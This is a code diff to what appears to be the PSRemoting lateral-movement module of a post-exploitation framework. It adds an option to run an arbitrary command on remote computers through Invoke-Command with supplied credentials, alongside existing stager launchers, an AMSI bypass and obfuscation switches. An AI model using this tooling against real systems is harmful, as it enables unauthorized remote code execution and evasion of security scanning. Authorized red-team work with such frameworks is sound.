@@ -57,7 +57,12 @@ class Module(object):
             },
             'Listener' : {
                 'Description'   :   'Listener to use.',
-                'Required'      :   True,
+                'Required'      :   False,
+                'Value'         :   ''
+            },
+            'Command' : {
+                'Description'   :   'Listener to use.',
+                'Required'      :   False,
                 'Value'         :   ''
             },
             'Obfuscate': {
@@ -126,6 +131,7 @@ class Module(object):
         AMSIBypass2 = False
 
         listenerName = self.options['Listener']['Value']
+        command = self.options['Command']['Value']
         userAgent = self.options['UserAgent']['Value']
         proxy = self.options['Proxy']['Value']
         proxyCreds = self.options['ProxyCreds']['Value']
@@ -141,6 +147,14 @@ class Module(object):
 
         script = """Invoke-Command """
 
+        # Only "Command" or "Listener" but not both
+        if (listenerName == "" and command  == ""):
+            print(helpers.color("[!] Listener or Command required"))
+            return ""
+        if (listenerName and command):
+            print(helpers.color("[!] Cannot use Listener and Command at the same time"))
+            return ""
+
         # if a credential ID is specified, try to parse
         credID = self.options["CredID"]['Value']
         if credID != "":
@@ -155,28 +169,30 @@ class Module(object):
             self.options["Password"]['Value'] = password
 
 
-        if not self.mainMenu.listeners.is_listener_valid(listenerName):
+        if not self.mainMenu.listeners.is_listener_valid(listenerName) and not command:
             # not a valid listener, return nothing for the script
             print(helpers.color("[!] Invalid listener: " + listenerName))
             return ""
 
-        else:
+        elif listenerName:
             # generate the PowerShell one-liner with all of the proper options set
             launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, obfuscate=Obfuscate, obfuscationCommand=ObfuscateCommand, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, AMSIBypass=AMSIBypass, AMSIBypass2=AMSIBypass2)
-                
             if launcher == "":
                 return ""
-            else:
-                # build the PSRemoting execution string
-                computerNames = "\"" + "\",\"".join(self.options['ComputerName']['Value'].split(",")) + "\""
-                script += " -ComputerName @("+computerNames+")"
-                script += " -ScriptBlock {" + launcher + "}"
 
-                if self.options["UserName"]['Value'] != "" and self.options["Password"]['Value'] != "":
-                    # add in the user credentials
-                    script = "$PSPassword = \""+password+"\" | ConvertTo-SecureString -asPlainText -Force;$Credential = New-Object System.Management.Automation.PSCredential(\""+userName+"\",$PSPassword);" + script + " -Credential $Credential"
+        else: # else command
+            launcher = command.replace('"', '`"')
+            
+        # build the PSRemoting execution string
+        computerNames = "\"" + "\",\"".join(self.options['ComputerName']['Value'].split(",")) + "\""
+        script += " -ComputerName @("+computerNames+")"
+        script += " -ScriptBlock {" + launcher + "}"
 
-                script += ";'Invoke-PSRemoting executed on " +computerNames +"'"
+        if self.options["UserName"]['Value'] != "" and self.options["Password"]['Value'] != "":
+            # add in the user credentials
+            script = "$PSPassword = \""+password+"\" | ConvertTo-SecureString -asPlainText -Force;$Credential = New-Object System.Management.Automation.PSCredential(\""+userName+"\",$PSPassword);" + script + " -Credential $Credential"
+
+        script += ";'Invoke-PSRemoting executed on " + computerNames +"'"
 
         if obfuscate:
             script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
